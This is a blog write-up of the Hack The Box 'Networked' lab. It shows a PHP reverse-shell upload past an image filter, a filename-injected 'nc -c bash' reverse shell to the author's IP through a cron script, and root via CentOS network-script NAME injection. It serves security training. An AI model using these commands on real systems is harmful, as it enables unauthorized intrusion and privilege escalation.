<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Networked — Hack The Box [Write-up]" /><meta name="author" content="0x3ashry" /><meta property="og:locale" content="en" /><meta name="description" content="Writeup for Networked Hackthebox Machine" /><meta property="og:description" content="Writeup for Networked Hackthebox Machine" /><link rel="canonical" href="https://0x3ashry.github.io/posts/Networked-Hack-The-Box-Write-up/" /><meta property="og:url" content="https://0x3ashry.github.io/posts/Networked-Hack-The-Box-Write-up/" /><meta property="og:site_name" content="0x3ashry’s Blog" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-05-21T17:10:00+02:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Networked — Hack The Box [Write-up]" /><meta name="twitter:site" content="@0x3ashry" /><meta name="twitter:creator" content="@0x3ashry" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"0x3ashry"},"dateModified":"2022-05-21T17:10:00+02:00","datePublished":"2022-05-21T17:10:00+02:00","description":"Writeup for Networked Hackthebox Machine","headline":"Networked — Hack The Box [Write-up]","mainEntityOfPage":{"@type":"WebPage","@id":"https://0x3ashry.github.io/posts/Networked-Hack-The-Box-Write-up/"},"url":"https://0x3ashry.github.io/posts/Networked-Hack-The-Box-Write-up/"}</script><title>Networked — Hack The Box [Write-up] | 0x3ashry's Blog</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="0x3ashry's Blog"><meta name="application-name" content="0x3ashry's Blog"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get MODE_ATTR() { return "data-mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" class="mx-auto"> <img src="/assets/img/favicons/android-chrome-512x512.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">0x3ashry's Blog</a></div><div class="site-subtitle font-italic">CyberSecurity geek, who wants to share his day-to-day knowledge</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/0x3ashry" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/0x3ashry" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['antony.magdy13','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Networked — Hack The Box [Write-up]</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Networked — Hack The Box [Write-up]</h1><div class="post-meta text-muted"> <span> Posted <em class="" data-ts="1653145800" data-df="ll" data-toggle="tooltip" data-placement="bottom"> May 21, 2022 </em> </span><div class="d-flex justify-content-between"> <span> By <em> Antony Magdy </em> </span><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1110 words"> <em>6 min</em> read</span></div></div></div><div class="post-content"><p><img data-src="/img/HTB/Networked/Networked.png" alt="" data-proofer-ignore></p><p>Networked is an easy rated Linux retired machine, with a white-box pentesting to exploit an upload vulnerability and get user privilege and then exploiting Redhat/CentOS network-scripts vulnerability to get root. Let’s get started.</p><h4 id="used-tools"><span class="mr-2">Used Tools:</span><a href="#used-tools" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><ul><li>nmap<li>gobuster<li>tar<li>netcat<li>touch</ul><h2 id="1-scanning--enumeration"><span class="mr-2">1. SCANNING &amp; ENUMERATION</span><a href="#1-scanning--enumeration" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>I will start with nmap and the -A parameter to enable OS detection, version detection, script scanning, and traceroute and append the output to tee command which save the in a file named “nmap” and also show the output on the screen.</p><p><img data-src="/img/HTB/Networked/img (1).png" alt="" data-proofer-ignore></p><p>We found 2 opened ports:</p><ul><li>22 for an SSH<li>80 for an HTTP server</ul><p>Checking the http page found nothing…</p><p><img data-src="/img/HTB/Networked/img (2).png" alt="" data-proofer-ignore></p><p>Checking the source code found a comment declaring that there are 2 pages called upload and gallery</p><p><img data-src="/img/HTB/Networked/img (3).png" alt="" data-proofer-ignore></p><p>tried access upload and gallery pages but got nothing, So tried directory bruteforcing…</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://10.10.10.146/ <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt <span class="nt">-o</span> directory.txt  2&gt;/dev/null
</pre></table></code></div></div><p>Found <code class="language-plaintext highlighter-rouge">/uploads, /backup</code></p><p><img data-src="/img/HTB/Networked/img (4).png" alt="" data-proofer-ignore></p><p>/uploads file contain nothing but <code class="language-plaintext highlighter-rouge">/backup</code> file contain backup.tar file</p><p><img data-src="/img/HTB/Networked/img (5).png" alt="" data-proofer-ignore></p><p>downloading the file and extracting it, Found 4 php code files…</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nb">tar </span>xvf backup.tar
</pre></table></code></div></div><p><img data-src="/img/HTB/Networked/img (6).png" alt="" data-proofer-ignore></p><p>After some careful analysis of the files, one thing I noticed was the way images are checked in the <code class="language-plaintext highlighter-rouge">upload.php</code> file (based on their Content-Type and file extension).</p><p>Another thing that stood out for me, was the fact that all error messages were uniquely identifiable so that you could easily track where you made a mistake which is a very big mistake in the development process to not double check that the error messages are the same.</p><p><code class="language-plaintext highlighter-rouge">upload.php:</code></p><p>Here it check the mime-type and the file size &lt; 6mb.</p><p>The mime-type check included a <code class="language-plaintext highlighter-rouge">dot</code> at the end of the message.</p><p>Note: check_file_type() is a function in the lib.php file that check the mime-type of the uploaded file</p><div class="language-php highlighter-rouge"><div class="code-header"> <span data-label-text="PHP"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="nf">check_file_type</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">"myFile"</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nb">filesize</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'myFile'</span><span class="p">][</span><span class="s1">'tmp_name'</span><span class="p">])</span> <span class="o">&lt;</span> <span class="mi">60000</span><span class="p">))</span> <span class="p">{</span>
      <span class="k">echo</span> <span class="s1">'&lt;pre&gt;Invalid image file.&lt;/pre&gt;'</span><span class="p">;</span>
      <span class="nf">displayform</span><span class="p">();</span>
    <span class="p">}</span>

</pre></table></code></div></div><p>While the extension check did not!</p><div class="language-php highlighter-rouge"><div class="code-header"> <span data-label-text="PHP"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre>
    <span class="c1">//$name = $_SERVER['REMOTE_ADDR'].'-'. $myFile["name"];</span>
    <span class="k">list</span> <span class="p">(</span><span class="nv">$foo</span><span class="p">,</span><span class="nv">$ext</span><span class="p">)</span> <span class="o">=</span> <span class="nf">getnameUpload</span><span class="p">(</span><span class="nv">$myFile</span><span class="p">[</span><span class="s2">"name"</span><span class="p">]);</span>
    <span class="nv">$validext</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">'.jpg'</span><span class="p">,</span> <span class="s1">'.png'</span><span class="p">,</span> <span class="s1">'.gif'</span><span class="p">,</span> <span class="s1">'.jpeg'</span><span class="p">);</span>
    <span class="nv">$valid</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$validext</span> <span class="k">as</span> <span class="nv">$vext</span><span class="p">)</span> <span class="p">{</span>
      <span class="k">if</span> <span class="p">(</span><span class="nb">substr_compare</span><span class="p">(</span><span class="nv">$myFile</span><span class="p">[</span><span class="s2">"name"</span><span class="p">],</span> <span class="nv">$vext</span><span class="p">,</span> <span class="o">-</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$vext</span><span class="p">))</span> <span class="o">===</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$valid</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
      <span class="p">}</span>
    <span class="p">}</span>

    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="nv">$valid</span><span class="p">))</span> <span class="p">{</span>
      <span class="k">echo</span> <span class="s2">"&lt;p&gt;Invalid image file&lt;/p&gt;"</span><span class="p">;</span>
      <span class="nf">displayform</span><span class="p">();</span>
      <span class="k">exit</span><span class="p">;</span>
    <span class="p">}</span>
</pre></table></code></div></div><p>So after further analysis of the files, I decided to check the files that I had not yet discovered for their existence on the web server.</p><p>Uploaded photos are displayed in teh <code class="language-plaintext highlighter-rouge">http://10.10.10.164/photos.php</code></p><p><img data-src="/img/HTB/Networked/img (7).png" alt="" data-proofer-ignore></p><p><code class="language-plaintext highlighter-rouge">http://10.10.10.164/upload.php</code> contain an upload form for image uploading…</p><p><img data-src="/img/HTB/Networked/img (8).png" alt="" data-proofer-ignore></p><p>index.php is the same as the default page and lib.php isn’t displayed of course because its a library file contain function used in /upload.php and /photos.php</p><h2 id="2-exploitation"><span class="mr-2">2. EXPLOITATION</span><a href="#2-exploitation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>I tried to upload normal images to check the flow of the application is as I thought.</p><p>Let’s use <code class="language-plaintext highlighter-rouge">php-reverse-shell.php</code> under /usr/share/webshells/php/ and make modificatins to it in order to bypass security conditions.</p><p>Append “GIF89a;” at the top of the file inorder to bypass the mime-type filtering…</p><p>and modify the $ip and $port for the local IP and the listening port we will be listening at…</p><p><img data-src="/img/HTB/Networked/img (9).png" alt="" data-proofer-ignore></p><p><img data-src="/img/HTB/Networked/img (10).png" alt="" data-proofer-ignore></p><p>Then rename the file to <code class="language-plaintext highlighter-rouge">php-findsock-shell.php.gif</code> and upload it to /upload.php</p><p><img data-src="/img/HTB/Networked/img (11).png" alt="" data-proofer-ignore></p><p>The file is uploaded successfully.</p><p><img data-src="/img/HTB/Networked/img (12).png" alt="" data-proofer-ignore></p><p>Create a listener on our local machine and then reload <code class="language-plaintext highlighter-rouge">http://10.10.10.146/photos.php</code></p><p><img data-src="/img/HTB/Networked/img (13).png" alt="" data-proofer-ignore></p><p>It will keep loading, Let’s check our netcat listener…</p><p><img data-src="/img/HTB/Networked/img (14).png" alt="" data-proofer-ignore></p><p>BOOOOOOOOM ! We successfully gained a shell for <code class="language-plaintext highlighter-rouge">apache</code> user.</p><p>but our user don’t have read permissions on the user flag as it belong to a user called <code class="language-plaintext highlighter-rouge">guly</code>.</p><h2 id="3-privilege-escalation"><span class="mr-2">3. PRIVILEGE ESCALATION:</span><a href="#3-privilege-escalation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h3 id="i-upgrade-to-guly"><span class="mr-2">I. Upgrade to guly</span><a href="#i-upgrade-to-guly" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>In the <code class="language-plaintext highlighter-rouge">/home/guly</code> there is a file called <code class="language-plaintext highlighter-rouge">crontab.guly</code></p><p>After reading it’s content I found that it’s a crontab file that executes <code class="language-plaintext highlighter-rouge">/home/guly/check_attack.php</code> every 3 minutes.</p><p><img data-src="/img/HTB/Networked/img (15).png" alt="" data-proofer-ignore></p><p>Let’s read check_attach.php file…</p><div class="language-php highlighter-rouge"><div class="code-header"> <span data-label-text="PHP"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
</pre><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
<span class="k">require</span> <span class="s1">'/var/www/html/lib.php'</span><span class="p">;</span>
<span class="nv">$path</span> <span class="o">=</span> <span class="s1">'/var/www/html/uploads/'</span><span class="p">;</span>
<span class="nv">$logpath</span> <span class="o">=</span> <span class="s1">'/tmp/attack.log'</span><span class="p">;</span>
<span class="nv">$to</span> <span class="o">=</span> <span class="s1">'guly'</span><span class="p">;</span>
<span class="nv">$msg</span><span class="o">=</span> <span class="s1">''</span><span class="p">;</span>
<span class="nv">$headers</span> <span class="o">=</span> <span class="s2">"X-Mailer: check_attack.php</span><span class="se">\r\n</span><span class="s2">"</span><span class="p">;</span>

<span class="nv">$files</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
<span class="nv">$files</span> <span class="o">=</span> <span class="nb">preg_grep</span><span class="p">(</span><span class="s1">'/^([^.])/'</span><span class="p">,</span> <span class="nb">scandir</span><span class="p">(</span><span class="nv">$path</span><span class="p">));</span>

<span class="k">foreach</span> <span class="p">(</span><span class="nv">$files</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$value</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$msg</span><span class="o">=</span><span class="s1">''</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span><span class="nv">$value</span> <span class="o">==</span> <span class="s1">'index.html'</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">continue</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="c1">#echo "-------------\n";</span>

  <span class="c1">#print "check: $value\n";</span>
  <span class="k">list</span> <span class="p">(</span><span class="nv">$name</span><span class="p">,</span><span class="nv">$ext</span><span class="p">)</span> <span class="o">=</span> <span class="nf">getnameCheck</span><span class="p">(</span><span class="nv">$value</span><span class="p">);</span>
  <span class="nv">$check</span> <span class="o">=</span> <span class="nf">check_ip</span><span class="p">(</span><span class="nv">$name</span><span class="p">,</span><span class="nv">$value</span><span class="p">);</span>

  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="nv">$check</span><span class="p">[</span><span class="mi">0</span><span class="p">]))</span> <span class="p">{</span>
    <span class="k">echo</span> <span class="s2">"attack!</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
    <span class="c1"># todo: attach file</span>
    <span class="nb">file_put_contents</span><span class="p">(</span><span class="nv">$logpath</span><span class="p">,</span> <span class="nv">$msg</span><span class="p">,</span> <span class="no">FILE_APPEND</span> <span class="o">|</span> <span class="no">LOCK_EX</span><span class="p">);</span>

    <span class="nb">exec</span><span class="p">(</span><span class="s2">"rm -f </span><span class="nv">$logpath</span><span class="s2">"</span><span class="p">);</span>
    <span class="nb">exec</span><span class="p">(</span><span class="s2">"nohup /bin/rm -f </span><span class="nv">$path$value</span><span class="s2"> &gt; /dev/null 2&gt;&amp;1 &amp;"</span><span class="p">);</span>
    <span class="k">echo</span> <span class="s2">"rm -f </span><span class="nv">$path$value</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
    <span class="nb">mail</span><span class="p">(</span><span class="nv">$to</span><span class="p">,</span> <span class="nv">$msg</span><span class="p">,</span> <span class="nv">$msg</span><span class="p">,</span> <span class="nv">$headers</span><span class="p">,</span> <span class="s2">"-F</span><span class="nv">$value</span><span class="s2">"</span><span class="p">);</span>
  <span class="p">}</span>
<span class="p">}</span>

<span class="cp">?&gt;</span>
</pre></table></code></div></div><p>After analyzing the script, it checks all files in the <code class="language-plaintext highlighter-rouge">/var/www/html/uploads</code> directory and then performs an <code class="language-plaintext highlighter-rouge">rm -f</code> on each file. However, if I can create a filename that looks just like a linux command, it will execute that just the same.</p><p>Let’s navigate to /var/www/html/uploads and write our file there…</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nb">touch</span> <span class="s2">"; nc -c bash 10.10.16.10 5555"</span>
</pre></table></code></div></div><p><img data-src="/img/HTB/Networked/img (16).png" alt="" data-proofer-ignore></p><p>Create a listener on port 5555 and wait for a connection…</p><p><img data-src="/img/HTB/Networked/img (17).png" alt="" data-proofer-ignore></p><p>BOOOOOOOOM ! We successfully upgraded to <code class="language-plaintext highlighter-rouge">guly</code> user and have the user.txt flag</p><h3 id="ii-upgrade-to-root"><span class="mr-2">II. Upgrade to root</span><a href="#ii-upgrade-to-root" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Let’s see if there are commands guly could execute as a root.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nb">sudo</span> <span class="nt">-l</span>
</pre></table></code></div></div><p>guly can execute <code class="language-plaintext highlighter-rouge">/usr/local/sbin/changename.sh</code> as a root without any password required</p><p><img data-src="/img/HTB/Networked/img (18).png" alt="" data-proofer-ignore></p><p>Reading the content of <code class="language-plaintext highlighter-rouge">changename.sh</code>…</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre><td class="rouge-code"><pre><span class="c">#!/bin/bash -p</span>
<span class="nb">cat</span> <span class="o">&gt;</span> /etc/sysconfig/network-scripts/ifcfg-guly <span class="o">&lt;&lt;</span> <span class="no">EoF</span><span class="sh">
DEVICE=guly0
ONBOOT=no
NM_CONTROLLED=no
</span><span class="no">EoF

</span><span class="nv">regexp</span><span class="o">=</span><span class="s2">"^[a-zA-Z0-9_</span><span class="se">\ </span><span class="s2">/-]+$"</span>

<span class="k">for </span>var <span class="k">in </span>NAME PROXY_METHOD BROWSER_ONLY BOOTPROTO<span class="p">;</span> <span class="k">do
        </span><span class="nb">echo</span> <span class="s2">"interface </span><span class="nv">$var</span><span class="s2">:"</span>
        <span class="nb">read </span>x
        <span class="k">while</span> <span class="o">[[</span> <span class="o">!</span> <span class="nv">$x</span> <span class="o">=</span>~ <span class="nv">$regexp</span> <span class="o">]]</span><span class="p">;</span> <span class="k">do
                </span><span class="nb">echo</span> <span class="s2">"wrong input, try again"</span>
                <span class="nb">echo</span> <span class="s2">"interface </span><span class="nv">$var</span><span class="s2">:"</span>
                <span class="nb">read </span>x
        <span class="k">done
        </span><span class="nb">echo</span> <span class="nv">$var</span><span class="o">=</span><span class="nv">$x</span> <span class="o">&gt;&gt;</span> /etc/sysconfig/network-scripts/ifcfg-guly
<span class="k">done</span>
  
/sbin/ifup guly0
</pre></table></code></div></div><p>The script reads the <code class="language-plaintext highlighter-rouge">/etc/sysconfig/network-scripts/ifcfg-guly</code> file and append to it <code class="language-plaintext highlighter-rouge">NAME, PROXY_METHOD, BROWSER_ONLY, BOOTPROTO</code> by taking them as an input from the user…</p><p>Searching about the <code class="language-plaintext highlighter-rouge">ifcfg-guly</code> file I found this article: https://seclists.org/fulldisclosure/2019/Apr/24</p><p>Which says that this file in CentOS is vulnerable:</p><p>If, for whatever reason, a user is able to write an ifcf-<whatever> script to /etc/sysconfig/network-scripts or it can adjust an existing one, **then your system in pwned**.</whatever></p><p>In my case, the <code class="language-plaintext highlighter-rouge">NAME=</code> attributed in these network scripts is not handled correctly. If you have <strong>white/blank space</strong> in the name the system tries to execute the part after the white/blank space.</p><p>Which means; <strong>everything after the first blank space is executed as root</strong>.</p><p>Let’s try to apply this and execute <code class="language-plaintext highlighter-rouge">changename.sh</code>…</p><p>Note: I will type test as an input in the 4 required fields during the execution of the script, and in the Name: parameter I will type <strong>test /bin/bash</strong> to execute /bin/bash as root</p><p><img data-src="/img/HTB/Networked/img (19).png" alt="" data-proofer-ignore></p><p>BOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOM !!!! Now we are root :D</p><p>Thank you so much for reading and I hope you learned a lot as I did ❤</p><h4 id="0x3ashry"><span class="mr-2"><strong><em>0x3ashry</em></strong></span><a href="#0x3ashry" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hackthebox/'>HackTheBox</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/htb/" class="post-tag no-text-decoration" >HTB</a> <a href="/tags/linux/" class="post-tag no-text-decoration" >Linux</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Networked+%E2%80%94+Hack+The+Box+%5BWrite-up%5D+-+0x3ashry%27s+Blog&url=https%3A%2F%2F0x3ashry.github.io%2Fposts%2FNetworked-Hack-The-Box-Write-up%2F" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Networked+%E2%80%94+Hack+The+Box+%5BWrite-up%5D+-+0x3ashry%27s+Blog&u=https%3A%2F%2F0x3ashry.github.io%2Fposts%2FNetworked-Hack-The-Box-Write-up%2F" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https%3A%2F%2F0x3ashry.github.io%2Fposts%2FNetworked-Hack-The-Box-Write-up%2F&text=Networked+%E2%80%94+Hack+The+Box+%5BWrite-up%5D+-+0x3ashry%27s+Blog" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/Poison-Hack-The-Box-Write-up/">Poison — Hack The Box [Write-up]</a><li><a href="/posts/BYUCTF-2022-Write-up/">BYUCTF 2022 [Write-up]</a><li><a href="/posts/Nest-Hack-The-Box-Write-up/">Nest — Hack The Box [Write-up]</a><li><a href="/posts/Valentine-Hack-The-Box-Write-up/">Valentine — Hack The Box [Write-up]</a><li><a href="/posts/Blunder-Hack-The-Box-Write-up/">Blunder — Hack The Box [Write-up]</a></ul></div><div id="access-tags"><div class="panel-heading">Trending 